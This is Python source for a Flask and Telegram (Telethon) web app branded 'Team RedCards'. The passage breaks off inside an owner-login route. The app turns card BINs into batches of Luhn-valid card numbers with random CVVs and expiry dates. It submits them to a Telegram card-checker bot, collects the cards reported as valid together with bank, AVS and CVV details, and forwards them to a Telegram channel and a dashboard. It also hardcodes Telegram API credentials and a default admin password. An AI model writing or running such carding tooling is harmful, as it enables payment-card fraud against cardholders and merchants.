import threading
import asyncio
import random
import time
import os
import json
import sqlite3
import secrets
import re
from functools import wraps
from datetime import datetime, timedelta
from flask import Flask, render_template_string, request, jsonify, redirect, session, url_for
from werkzeug.security import generate_password_hash, check_password_hash
from telethon import TelegramClient, events
from telethon.errors import FloodWaitError, RPCError

# ============ CONFIG ============
API_ID = int(os.environ.get('API_ID', '22154650'))
API_HASH = os.environ.get('API_HASH', '2b554e270efb419af271c47ffe1d72d3')
SESSION_NAME = 'session_secure'

channel_env = os.environ.get('CHANNEL_ID', '-1003101739772')
try:
    CHANNEL_ID = int(channel_env)
except ValueError:
    CHANNEL_ID = channel_env

PORT = int(os.environ.get('PORT', 8080))

# ============ GLOBALS ============
client = TelegramClient(SESSION_NAME, API_ID, API_HASH)
log_messages = []
lives_list = []
sent_ccs = []
response_messages = []
approved_count = 0
declined_count = 0
total_sent = 0
channelid = -1003101739772

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', secrets.token_hex(32))
app.permanent_session_lifetime = timedelta(days=7)

LIVES_FILE = 'lives_database.json'
DB_FILE = 'users.db'
OWNER_CONFIG_FILE = 'owner_config.json'
SENT_CCS_FILE = 'sent_ccs.json'
RESPONSES_FILE = 'responses.json'

OWNER_CONFIG = None

# ============ OWNER CONFIG ============
def init_owner_config():
    global OWNER_CONFIG
    
    if os.path.exists(OWNER_CONFIG_FILE):
        try:
            with open(OWNER_CONFIG_FILE, 'r') as f:
                OWNER_CONFIG = json.load(f)
                print(f"\n{'='*100}")
                print(f"✅ CONFIG OWNER CARGADA")
                print(f"{'='*100}")
                print(f"🔐 URL: {OWNER_CONFIG['secret_url']}")
                print(f"👤 Usuario: {OWNER_CONFIG['username']}")
                print(f"🔑 Contraseña: {OWNER_CONFIG['password']}")
                print(f"{'='*100}\n")
                return OWNER_CONFIG
        except:
            pass
    
    config = {
        "secret_url": secrets.token_urlsafe(32),
        "username": "admin",
        "password": "ChangeMe123!@#",
        "created_at": datetime.now().isoformat()
    }
    
    with open(OWNER_CONFIG_FILE, 'w') as f:
        json.dump(config, f, indent=2)
    
    OWNER_CONFIG = config
    
    print(f"\n{'='*100}")
    print(f"🆕 NUEVA CONFIG OWNER")
    print(f"{'='*100}")
    print(f"🔐 URL: /secret/{config['secret_url']}/owner_login")
    print(f"👤 Usuario: {config['username']}")
    print(f"🔑 Contraseña: {config['password']}")
    print(f"{'='*100}\n")
    
    return config

def get_owner_config():
    global OWNER_CONFIG
    if OWNER_CONFIG is None:
        init_owner_config()
    return OWNER_CONFIG

# ============ DB ============
def init_db():
    try:
        conn = sqlite3.connect(DB_FILE)
        c = conn.cursor()
        
        c.execute('''CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            username TEXT UNIQUE NOT NULL,
            email TEXT UNIQUE NOT NULL,
            password_hash TEXT NOT NULL,
            role TEXT DEFAULT 'user',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            last_login TIMESTAMP,
            is_active INTEGER DEFAULT 1,
            failed_attempts INTEGER DEFAULT 0,
            locked_until TIMESTAMP
        )''')
        
        conn.commit()
        conn.close()
        print("✅ Base de datos inicializada")
    except Exception as e:
        print(f"❌ Error BD: {e}")

def get_db():
    conn = sqlite3.connect(DB_FILE)
    conn.row_factory = sqlite3.Row
    return conn

def load_lives_from_file():
    global lives_list
    if os.path.exists(LIVES_FILE):
        try:
            with open(LIVES_FILE, 'r', encoding='utf-8') as f:
                lives_list = json.load(f)
        except:
            lives_list = []

def save_lives_to_file():
    try:
        with open(LIVES_FILE, 'w', encoding='utf-8') as f:
            json.dump(lives_list, f, indent=2, ensure_ascii=False)
    except:
        pass

def load_sent_ccs():
    global sent_ccs
    if os.path.exists(SENT_CCS_FILE):
        try:
            with open(SENT_CCS_FILE, 'r') as f:
                sent_ccs = json.load(f)
        except:
            sent_ccs = []

def save_sent_ccs():
    try:
        with open(SENT_CCS_FILE, 'w') as f:
            json.dump(sent_ccs, f, indent=2)
    except:
        pass

def load_responses():
    global response_messages
    if os.path.exists(RESPONSES_FILE):
        try:
            with open(RESPONSES_FILE, 'r', encoding='utf-8') as f:
                response_messages = json.load(f)
        except:
            response_messages = []

def save_responses():
    try:
        with open(RESPONSES_FILE, 'w', encoding='utf-8') as f:
            json.dump(response_messages, f, indent=2, ensure_ascii=False)
    except:
        pass

def check_brute_force(username):
    try:
        conn = get_db()
        c = conn.cursor()
        c.execute('SELECT failed_attempts, locked_until FROM users WHERE username = ?', (username,))
        user = c.fetchone()
        conn.close()
        
        if user and user['locked_until']:
            locked_time = datetime.fromisoformat(user['locked_until'])
            if datetime.now() < locked_time:
                return True
    except:
        pass
    return False

def increment_failed_attempts(username):
    try:
        conn = get_db()
        c = conn.cursor()
        c.execute('SELECT failed_attempts FROM users WHERE username = ?', (username,))
        user = c.fetchone()
        if user:
            new_attempts = user['failed_attempts'] + 1
            if new_attempts >= 5:
                lock_time = (datetime.now() + timedelta(minutes=15)).isoformat()
                c.execute('UPDATE users SET failed_attempts = ?, locked_until = ? WHERE username = ?',
                         (new_attempts, lock_time, username))
            else:
                c.execute('UPDATE users SET failed_attempts = ? WHERE username = ?', (new_attempts, username))
            conn.commit()
        conn.close()
    except:
        pass

def reset_failed_attempts(username):
    try:
        conn = get_db()
        c = conn.cursor()
        c.execute('UPDATE users SET failed_attempts = 0, locked_until = NULL WHERE username = ?', (username,))
        conn.commit()
        conn.close()
    except:
        pass

# ============ DECORADORES ============
def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'user_id' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

# ============ LUHN ============
def luhn_checksum(card_number):
    def digits_of(n):
        return [int(d) for d in str(n)]
    digits = digits_of(card_number)
    odd_digits = digits[-1::-2]
    even_digits = digits[-2::-2]
    checksum = sum(odd_digits)
    for d in even_digits:
        checksum += sum(digits_of(d * 2))
    return checksum % 10

def generate_luhn_digit(partial_card):
    check_digit = luhn_checksum(str(partial_card) + '0')
    return (10 - check_digit) % 10

def is_date_valid(month, year):
    try:
        month = int(month)
        year = int(year)
        if year <= 30:
            year += 2000
        elif year <= 99:
            year += 1900
        if month == 12:
            expiry_date = datetime(year + 1, 1, 1) - timedelta(days=1)
        else:
            expiry_date = datetime(year, month + 1, 1) - timedelta(days=1)
        return expiry_date >= datetime.now()
    except:
        return False

def generate_random_valid_date():
    now = datetime.now()
    days_ahead = random.randint(0, 365 * 5)
    future_date = now + timedelta(days=days_ahead)
    month = f"{future_date.month:02d}"
    year = f"{future_date.year}"
    return month, year

def generate_cc_variants(ccbase, count=20):
    if ',' in ccbase:
        separator = ','
    elif '|' in ccbase:
        separator = '|'
    else:
        log_messages.append(f"❌ Formato desconocido")
        return []
    
    parts = ccbase.strip().split(separator)
    if len(parts) < 4:
        log_messages.append(f"❌ Formato inválido")
        return []
    
    cardnumber = parts[0].strip()
    month = parts[1].strip()
    year = parts[2].strip()
    
    if len(cardnumber) < 12:
        log_messages.append(f"❌ Tarjeta muy corta")
        return []
    
    date_is_valid = is_date_valid(month, year)
    variants = []
    
    if not date_is_valid:
        log_messages.append(f"⚠️ Fecha vencida")
        month, year = generate_random_valid_date()
        log_messages.append(f"✓ Actualizada")
    
    bin_number = cardnumber[:-4]
    
    for i in range(count):
        random_digits = ''.join([str(random.randint(0, 9)) for _ in range(3)])
        partial = bin_number + random_digits
        luhn_digit = generate_luhn_digit(partial)
        complete_number = partial + str(luhn_digit)
        random_cvv = random.randint(100, 999)
        variant = f"{complete_number}{separator}{month}{separator}{year}{separator}{random_cvv}"
        if variant not in variants:
            variants.append(variant)
    
    return variants

# ============ TELETHON ============

async def response_handler(event):
    global approved_count, declined_count, lives_list, response_messages
    try:
        full_message = event.message.message if event.message.message else ""
        message_lower = full_message.lower()
        
        response_entry = {
            "message": full_message,
            "timestamp": datetime.now().isoformat(),
            "type": "unknown"
        }
        
        if "✅" in full_message or "approved" in message_lower or "valid" in message_lower:
            approved_count += 1
            response_entry["type"] = "approved"
            log_messages.append(f"✅ LIVE DETECTADA")
            
            lines = full_message.split('\n')
            data = {
                "cc": "",
                "status": "✅ APPROVED",
                "response": "",
                "country": "🌍 Unknown",
                "bank": "🏦 Unknown",
                "type": "💳 VISA/MC",
                "gate": "AlphaChecker",
                "bin": "",
                "avs": "",
                "cvv": "",
                "zip": "",
                "address": "",
                "amount": "",
                "currency": "",
                "processor": "",
                "error": "",
                "reason": "",
                "code": "",
                "descriptor": "",
                "merchant": "",
                "raw": full_message,
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            }
            
            for line in lines:
                line_lower = line.lower()
                
                if 'cc:' in line_lower or 'card' in line_lower:
                    data["cc"] = line.split(':', 1)[1].strip() if ':' in line else ""
                elif 'status:' in line_lower:
                    data["status"] = line.split(':', 1)[1].strip() if ':' in line else "✅ APPROVED"
                elif 'response:' in line_lower:
                    data["response"] = line.split(':', 1)[1].strip() if ':' in line else ""
                elif 'country:' in line_lower:
                    data["country"] = line.split(':', 1)[1].strip() if ':' in line else "🌍 Unknown"
                elif 'bank:' in line_lower:
                    data["bank"] = line.split(':', 1)[1].strip() if ':' in line else "🏦 Unknown"
                elif 'type:' in line_lower:
                    data["type"] = line.split(':', 1)[1].strip() if ':' in line else "💳 VISA/MC"
                elif 'gate:' in line_lower or 'checker' in line_lower:
                    data["gate"] = line.split(':', 1)[1].strip() if ':' in line else "AlphaChecker"
                elif 'bin:' in line_lower:
                    data["bin"] = line.split(':', 1)[1].strip() if ':' in line else ""
                elif 'avs:' in line_lower:
                    data["avs"] = line.split(':', 1)[1].strip() if ':' in line else ""
                elif 'cvv:' in line_lower:
                    data["cvv"] = line.split(':', 1)[1].strip() if ':' in line else ""
                elif 'zip' in line_lower or 'postal' in line_lower:
                    data["zip"] = line.split(':', 1)[1].strip() if ':' in line else ""
                elif 'address:' in line_lower:
                    data["address"] = line.split(':', 1)[1].strip() if ':' in line else ""
                elif 'amount:' in line_lower:
                    data["amount"] = line.split(':', 1)[1].strip() if ':' in line else ""
                elif 'currency:' in line_lower:
                    data["currency"] = line.split(':', 1)[1].strip() if ':' in line else ""
                elif 'processor:' in line_lower:
                    data["processor"] = line.split(':', 1)[1].strip() if ':' in line else ""
                elif 'error:' in line_lower:
                    data["error"] = line.split(':', 1)[1].strip() if ':' in line else ""
                elif 'reason:' in line_lower:
                    data["reason"] = line.split(':', 1)[1].strip() if ':' in line else ""
                elif 'code:' in line_lower:
                    data["code"] = line.split(':', 1)[1].strip() if ':' in line else ""
                elif 'descriptor:' in line_lower:
                    data["descriptor"] = line.split(':', 1)[1].strip() if ':' in line else ""
                elif 'merchant:' in line_lower:
                    data["merchant"] = line.split(':', 1)[1].strip() if ':' in line else ""
            
            lives_list.append(data)
            response_messages.append(response_entry)
            save_lives_to_file()
            save_responses()
            
            try:
                msg = f"""
╔════════════════════════════════════════════╗
           🟢 LIVE ENCONTRADA 🟢
╚════════════════════════════════════════════╝

💳 CC: {data['cc']}
✅ Status: {data['status']}
📊 Response: {data['response']}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🗺️ País: {data['country']}
🏦 Banco: {data['bank']}
💰 Tipo: {data['type']}
🎯 Gate: {data['gate']}
🔢 BIN: {data['bin']}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✔️ AVS: {data['avs']}
✔️ CVV: {data['cvv']}
📮 ZIP: {data['zip']}
📍 Address: {data['address']}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💵 Amount: {data['amount']}
🪙 Currency: {data['currency']}
🔧 Processor: {data['processor']}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⏰ {data['timestamp']}
"""
                await client.send_message(channelid, msg)
            except:
                pass
            
            if len(lives_list) > 100:
                lives_list.pop(0)
                save_lives_to_file()
        
        elif "❌" in full_message or "declined" in message_lower:
            declined_count += 1
            response_entry["type"] = "declined"
            log_messages.append(f"❌ DECLINADA")
            response_messages.append(response_entry)
            save_responses()
        
        if len(log_messages) > 100:
            log_messages.pop(0)
        if len(response_messages) > 100:
            response_messages.pop(0)
    except Exception as e:
        pass

async def load_commands():
    try:
        if os.path.exists('cmds.txt'):
            with open('cmds.txt', 'r') as f:
                cmds = [line.strip() for line in f if line.strip()]
                if cmds:
                    return cmds
    except:
        pass
    return ['/check']

async def send_to_bot():
    global total_sent
    while True:
        try:
            if not os.path.exists('ccs.txt'):
                await asyncio.sleep(30)
                continue
            
            with open('ccs.txt', 'r') as f:
                ccs_list = f.readlines()
            
            if ccs_list:
                current_cc = ccs_list[0].strip()
                if len(ccs_list) > 1:
                    with open('ccs.txt', 'w') as f:
                        f.writelines(ccs_list[1:])
                else:
                    with open('ccs.txt', 'w') as f:
                        f.write("")
                
                log_messages.append(f"🔄 BIN: {current_cc[:12]}...")
                cc_variants = generate_cc_variants(current_cc, count=20)
                
                if not cc_variants:
                    await asyncio.sleep(20)
                    continue
                
                commands = await load_commands()
                
                for i in range(0, len(cc_variants), 2):
                    pair = cc_variants[i:i+2]
                    tasks = []
                    
                    for j, cc in enumerate(pair):
                        selected_command = random.choice(commands)
                        message = f"{selected_command} {cc}"
                        
                        sent_entry = {
                            "cc": cc,
                            "command": selected_command,
                            "timestamp": datetime.now().isoformat()
                        }
                        sent_ccs.append(sent_entry)
                        total_sent += 1
                        
                        async def send_cc(msg, idx):
                            try:
                                await client.send_message('@Alphachekerbot', msg)
                                num = i + idx + 1
                                log_messages.append(f"✓ #{num}/20")
                            except:
                                pass
                        
                        tasks.append(send_cc(message, j))
                    
                    await asyncio.gather(*tasks)
                    await asyncio.sleep(21)
                
                log_messages.append(f"🎉 Lote OK ({len(cc_variants)} CCs)")
                save_sent_ccs()
            else:
                await asyncio.sleep(20)
        except Exception as e:
            await asyncio.sleep(20)

async def start_client():
    try:
        log_messages.append("🚀 Bot iniciando...")
        await client.start()
        log_messages.append("✅ Bot conectado")
        client.add_event_handler(response_handler, events.MessageEdited(chats='@Alphachekerbot'))
        await asyncio.gather(send_to_bot(), client.run_until_disconnected())
    except Exception as e:
        log_messages.append(f"❌ Error")

def telethon_thread_fn():
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.run_until_complete(start_client())

# ============ RUTAS ============

@app.route('/')
def index():
    if 'user_id' in session:
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '')
        
        if not username or not password:
            return jsonify({'error': 'Campos requeridos'}), 400
        
        if check_brute_force(username):
            return jsonify({'error': 'Cuenta bloqueada'}), 429
        
        try:
            conn = get_db()
            c = conn.cursor()
            c.execute('SELECT id, username, password_hash, is_active FROM users WHERE username = ?', (username,))
            user = c.fetchone()
            conn.close()
            
            if not user or not user['is_active']:
                increment_failed_attempts(username)
                return jsonify({'error': 'Credenciales incorrectas'}), 401
            
            if not check_password_hash(user['password_hash'], password):
                increment_failed_attempts(username)
                return jsonify({'error': 'Credenciales incorrectas'}), 401
            
            reset_failed_attempts(username)
            session['user_id'] = user['id']
            session['username'] = user['username']
            session.permanent = True
            
            conn = get_db()
            c = conn.cursor()
            c.execute('UPDATE users SET last_login = ? WHERE id = ?', (datetime.now().isoformat(), user['id']))
            conn.commit()
            conn.close()
            
            return jsonify({'success': True, 'redirect': url_for('dashboard')})
        except:
            return jsonify({'error': 'Error servidor'}), 500
    
    html = '''<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>🔐 SCRAPPER</title><style>*{margin:0;padding:0;box-sizing:border-box}html{scroll-behavior:smooth}body{background:linear-gradient(135deg,#0a0e27 0%,#1a1a3e 30%,#2d1b3d 60%,#0a0e27 100%);font-family:'Segoe UI',Tahoma,Geneva,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;overflow:hidden;position:relative}body::before{content:'';position:fixed;top:0;left:0;right:0;bottom:0;background:radial-gradient(circle at 20% 50%, rgba(255,20,20,0.15) 0%, transparent 40%),radial-gradient(circle at 80% 80%, rgba(20,20,255,0.15) 0%, transparent 40%),radial-gradient(circle at 50% 0%, rgba(255,170,0,0.08) 0%, transparent 50%);pointer-events:none;z-index:0;animation:float 20s ease-in-out infinite}body::after{content:'';position:fixed;top:0;left:0;right:0;bottom:0;background:url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='none' fill-rule='evenodd'%3E%3Cg fill='%23ff1414' fill-opacity='0.03'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/g%3E%3C/svg%3E");pointer-events:none;z-index:0;opacity:0.5}@keyframes float{0%,100%{transform:translateY(0px)}50%{transform:translateY(20px)}}.login-container{background:rgba(255,20,20,0.07);border:3px solid #ff1414;border-radius:30px;padding:70px 60px;width:100%;max-width:480px;box-shadow:0 0 100px rgba(255,20,20,0.3),inset 0 0 30px rgba(255,20,20,0.1);backdrop-filter:blur(20px);position:relative;z-index:10;animation:slideUp 0.8s cubic-bezier(0.34,1.56,0.64,1);transform:perspective(1000px) rotateX(0deg)}.login-container h1{color:#ff1414;margin-bottom:15px;text-align:center;font-size:3em;text-shadow:0 0 30px rgba(255,20,20,0.8),0 0 60px rgba(255,20,20,0.4);letter-spacing:3px;font-weight:900}.login-container p{color:#ffaa00;text-align:center;margin-bottom:35px;font-size:1em;opacity:0.95;letter-spacing:1px;text-transform:uppercase}.form-group{margin-bottom:30px;position:relative}.form-group label{display:block;color:#ffaa00;margin-bottom:12px;font-weight:700;text-transform:uppercase;letter-spacing:1.5px;font-size:0.95em}.form-group input{width:100%;padding:16px 20px;background:rgba(0,0,0,0.4);border:2px solid #ff1414;border-radius:12px;color:#fff;font-size:1.05em;transition:all 0.4s cubic-bezier(0.34,1.56,0.64,1);font-weight:500;box-shadow:inset 0 2px 8px rgba(0,0,0,0.3)}.form-group input:focus{outline:none;border-color:#ffaa00;box-shadow:0 0 30px rgba(255,170,0,0.6),inset 0 2px 8px rgba(0,0,0,0.3);background:rgba(0,0,0,0.5);transform:translateY(-2px)}.form-group input::placeholder{color:#ff741450}.login-btn{width:100%;padding:16px;background:linear-gradient(135deg,#ff1414 0%,#cc0000 50%,#ff1414 100%);background-size:200% 200%;border:3px solid #ffaa00;border-radius:12px;color:white;font-weight:900;font-size:1.15em;cursor:pointer;text-transform:uppercase;transition:all 0.4s cubic-bezier(0.34,1.56,0.64,1);box-shadow:0 8px 30px rgba(255,20,20,0.5),inset 0 -2px 5px rgba(0,0,0,0.3);letter-spacing:2px}.login-btn:hover{transform:translateY(-3px);box-shadow:0 12px 50px rgba(255,20,20,0.7),inset 0 -2px 5px rgba(0,0,0,0.3);background-position:200% 0}.login-btn:active{transform:translateY(-1px);box-shadow:0 5px 20px rgba(255,20,20,0.5)}.error-message{color:#ff6b6b;text-align:center;margin-bottom:20px;font-weight:700;font-size:1em;padding:15px;background:rgba(255,20,20,0.15);border-left:4px solid #ff1414;border-radius:8px;display:none;animation:slideDown 0.4s ease-out}.loading{display:inline-block;width:4px;height:4px;border-radius:50%;background:#ffaa00;margin-left:5px;animation:blink 1.4s infinite}@keyframes slideUp{from{opacity:0;transform:translateY(40px) rotateX(-20deg)}to{opacity:1;transform:translateY(0) rotateX(0deg)}}@keyframes slideDown{from{opacity:0;transform:translateY(-10px)}to{opacity:1;transform:translateY(0)}}@keyframes blink{0%,20%,50%,80%,100%{opacity:0}40%{opacity:1}}</style></head><body><div class="login-container"><h1>🔐 SCRAPPER</h1><p>Team RedCards 💎 VIP ACCESS</p><div id="error-msg" class="error-message"></div><form id="login-form"><div class="form-group"><label>👤 Usuario</label><input type="text" name="username" id="username" placeholder="Ingresa tu usuario" required autocomplete="off"></div><div class="form-group"><label>🔑 Contraseña</label><input type="password" name="password" id="password" placeholder="Ingresa tu contraseña" required autocomplete="off"></div><button type="submit" class="login-btn">🚀 ENTRAR<span class="loading" id="loading"></span></button></form></div><script>document.getElementById('login-form').addEventListener('submit',function(e){e.preventDefault();const err=document.getElementById('error-msg');const btn=document.querySelector('.login-btn');err.style.display='none';btn.disabled=true;fetch('/login',{method:'POST',body:new FormData(this)}).then(r=>r.json()).then(d=>{if(d.success)window.location.href=d.redirect;else{err.textContent='❌ '+d.error;err.style.display='block';btn.disabled=false;}}).catch(e=>{btn.disabled=false;});});</script></body></html>'''
    return render_template_string(html)

@app.route('/dashboard')
@login_required
def dashboard():
    html = '''<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>🎮 SCRAPPER DASHBOARD</title><style>*{margin:0;padding:0;box-sizing:border-box}html{scroll-behavior:smooth}body{background:linear-gradient(135deg,#0a0e27,#1a1a3e,#2d1b3d);font-family:'Segoe UI',sans-serif;color:#fff;min-height:100vh;padding:25px;overflow-x:hidden}::selection{background:#ff1414;color:#fff;}.container{max-width:1920px;margin:0 auto}.top-bar{display:flex;justify-content:space-between;align-items:center;margin-bottom:30px;padding:25px 40px;background:linear-gradient(135deg,rgba(255,20,20,0.2),rgba(20,20,255,0.1));border:3px solid #ff1414;border-radius:20px;box-shadow:0 15px 50px rgba(255,20,20,0.2),inset 0 0 20px rgba(255,20,20,0.05);backdrop-filter:blur(10px)}.user-info{color:#ffaa00;font-weight:bold;font-size:1.2em;display:flex;align-items:center;gap:12px;letter-spacing:0.5px}.logout-btn{padding:14px 30px;background:linear-gradient(135deg,#ff1414,#cc0000);border:3px solid #ffaa00;border-radius:10px;color:white;cursor:pointer;font-weight:bold;transition:all 0.3s;text-transform:uppercase;letter-spacing:1px}.logout-btn:hover{transform:translateY(-2px);box-shadow:0 8px 25px rgba(255,20,20,0.5)}.header{text-align:center;margin-bottom:50px;padding:60px 50px;background:linear-gradient(135deg,rgba(255,20,20,0.15),rgba(255,20,20,0.08));border:4px solid #ff1414;border-radius:25px;box-shadow:0 20px 60px rgba(255,20,20,0.2)}.header h1{font-size:4.5em;color:#ff1414;text-shadow:0 0 40px rgba(255,20,20,0.9),0 0 80px rgba(255,20,20,0.4);margin-bottom:15px;letter-spacing:3px;font-weight:900}.header p{color:#ffaa00;font-size:1.15em;opacity:0.9;letter-spacing:1px}.stats{display:grid;grid-template-columns:repeat(auto-fit,minmax(320px,1fr));gap:30px;margin-bottom:50px}.stat-box{background:linear-gradient(135deg,rgba(255,20,20,0.15),rgba(255,20,20,0.08));padding:50px;border-radius:25px;border:4px solid #ff1414;text-align:center;box-shadow:0 15px 50px rgba(255,20,20,0.2);transition:all 0.4s cubic-bezier(0.34,1.56,0.64,1);position:relative;overflow:hidden}.stat-box::before{content:'';position:absolute;top:0;left:0;right:0;bottom:0;background:radial-gradient(circle at top right, rgba(255,170,0,0.1), transparent);pointer-events:none}.stat-box:hover{transform:translateY(-8px);box-shadow:0 25px 70px rgba(255,20,20,0.3);border-color:#ffaa00}.stat-box h3{color:#ffaa00;margin-bottom:20px;font-size:1.4em;text-transform:uppercase;letter-spacing:1.5px;font-weight:700}.stat-box .number{font-size:6em;font-weight:900;color:#ff1414;text-shadow:0 0 30px rgba(255,20,20,0.6);line-height:1;margin-bottom:10px;font-family:'Courier New',monospace}.stat-box .icon{font-size:3.5em;margin-bottom:20px;animation:bounce 2s infinite}.main{display:grid;grid-template-columns:1fr 1.3fr;gap:30px;margin-bottom:40px}.section{background:linear-gradient(135deg,rgba(255,20,20,0.12),rgba(255,20,20,0.05));padding:40px;border-radius:25px;border:3px solid #ff1414;box-shadow:0 15px 50px rgba(255,20,20,0.15)}.section h2{color:#ffaa00;margin-bottom:30px;font-size:2em;display:flex;align-items:center;gap:12px;text-transform:uppercase;letter-spacing:1.5px;font-weight:700}.ccs-box{background:rgba(0,0,0,0.7);padding:25px;border-radius:18px;height:650px;overflow-y:auto;border:2px solid #ff1414;font-family:'Courier New',monospace;font-size:0.95em;box-shadow:inset 0 4px 15px rgba(0,0,0,0.5)}.lives-box{background:rgba(0,0,0,0.7);padding:25px;border-radius:18px;height:650px;overflow-y:auto;border:2px solid #ff1414;box-shadow:inset 0 4px 15px rgba(0,0,0,0.5)}.cc-item{padding:15px;border-bottom:2px solid rgba(255,20,20,0.3);color:#ffaa00;line-height:1.8;border-left:4px solid rgba(255,20,20,0.2);margin-bottom:8px;border-radius:4px;transition:all 0.3s}.cc-item:hover{background:rgba(255,20,20,0.05);border-left-color:#ff1414}.cc-item.live{background:rgba(0,255,0,0.08);color:#00ff00;border-left-color:#00ff00}.live-card{background:linear-gradient(135deg,rgba(0,255,0,0.1),rgba(0,255,0,0.05));padding:20px;margin-bottom:15px;border-radius:12px;border-left:5px solid #00ff00;box-shadow:0 5px 15px rgba(0,255,0,0.1)}.live-card-title{color:#00ff00;font-weight:bold;font-size:1.15em;margin-bottom:12px;letter-spacing:0.5px}.live-card-info{color:#ffaa00;font-size:0.93em;line-height:1.8;display:grid;grid-template-columns:1fr 1fr;gap:8px}.live-card-info span{display:block;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}.scrollbar::-webkit-scrollbar{width:10px}.scrollbar::-webkit-scrollbar-track{background:rgba(0,0,0,0.4);border-radius:10px}.scrollbar::-webkit-scrollbar-thumb{background:linear-gradient(180deg,#ff1414,#cc0000);border-radius:10px}.scrollbar::-webkit-scrollbar-thumb:hover{background:linear-gradient(180deg,#ffaa00,#ff1414)}@keyframes bounce{0%,100%{transform:translateY(0)}50%{transform:translateY(-10px)}}@media(max-width:1400px){.main{grid-template-columns:1fr}.lives-box{height:500px}}</style></head><body><div class="container"><div class="top-bar"><div class="user-info">👤 {{ username }}</div><button class="logout-btn" onclick="location.href='/logout'">🚪 SALIR</button></div><div class="header"><h1>🎮 SCRAPPER TEAM REDCARDS 🔴</h1><p>Dashboard Real-Time Control Center 💎</p></div><div class="stats"><div class="stat-box"><div class="icon">✅</div><h3>Lives</h3><div class="number" id="approved">0</div></div><div class="stat-box"><div class="icon">❌</div><h3>Declinadas</h3><div class="number" id="declined">0</div></div><div class="stat-box"><div class="icon">📤</div><h3>Enviadas</h3><div class="number" id="sent">0</div></div><div class="stat-box"><div class="icon">💎</div><h3>Guardadas</h3><div class="number" id="lives-count">0</div></div></div><div class="main"><div class="section"><h2>📤 CCs ENVIADAS</h2><div class="ccs-box scrollbar" id="ccs"></div></div><div class="section"><h2>✅ LIVES DETECTADAS</h2><div class="lives-box scrollbar" id="lives"></div></div></div></div><script>function update(){fetch('/get_logs').then(r=>r.json()).then(d=>{document.getElementById('approved').textContent=d.approved;document.getElementById('declined').textContent=d.declined;});fetch('/get_sent').then(r=>r.json()).then(d=>{document.getElementById('sent').textContent=d.total;const ccsDiv=document.getElementById('ccs');ccsDiv.innerHTML=d.sent.slice(-50).reverse().map(s=>`<div class="cc-item">💳 ${s.cc}<br><span style="color:#888;font-size:0.85em">🎯 ${s.command} | ⏰ ${s.timestamp.split('T')[1].split('.')[0]}</span></div>`).join('');});fetch('/get_lives').then(r=>r.json()).then(d=>{document.getElementById('lives-count').textContent=d.lives.length;const livesDiv=document.getElementById('lives');livesDiv.innerHTML=d.lives.slice(-20).reverse().map(l=>`<div class="live-card"><div class="live-card-title">💚 ${l.cc?l.cc.substring(0,12)+'...':'N/A'} - ${l.status}</div><div class="live-card-info"><span>🏦 ${l.bank}</span><span>🗺️ ${l.country}</span><span>💰 ${l.type}</span><span>🎯 ${l.gate}</span><span>✔️ AVS: ${l.avs||'N/A'}</span><span>✔️ CVV: ${l.cvv||'N/A'}</span><span>📮 ZIP: ${l.zip||'N/A'}</span><span>💵 ${l.amount||'N/A'}</span><span>🪙 ${l.currency||'N/A'}</span><span>⏰ ${l.timestamp}</span></div></div>`).join('');}); }setInterval(update,1500);update();</script></body></html>'''
    return render_template_string(html, username=session.get('username'))

@app.route('/logout')
def logout():
    session.clear()
    return redirect(url_for('login'))

@app.route('/secret/<secret_url>/owner_login', methods=['GET', 'POST'])
def owner_login(secret_url):
    owner_config = get_owner_config()
    
    if not owner_config or secret_url != owner_config.get('secret_url'):
        return "NOT FOUND", 404
    
    if request.method == 'POST':
        username = request.form.get('username', '').strip()
        password = request.form.get('password', '').strip()
        
        if username == owner_config.get('username') and password == owner_config.get('password'):
            session['owner_authenticated'] = True
            session['owner_secret_url'] = secret_url
            session.permanent = True
            return jsonify({'success': True, 'redirect': url_for('owner_panel', secret_url=secret_url)})
        else:
            return jsonify({'error': 'Credenciales INCORRECTAS'}), 401
    
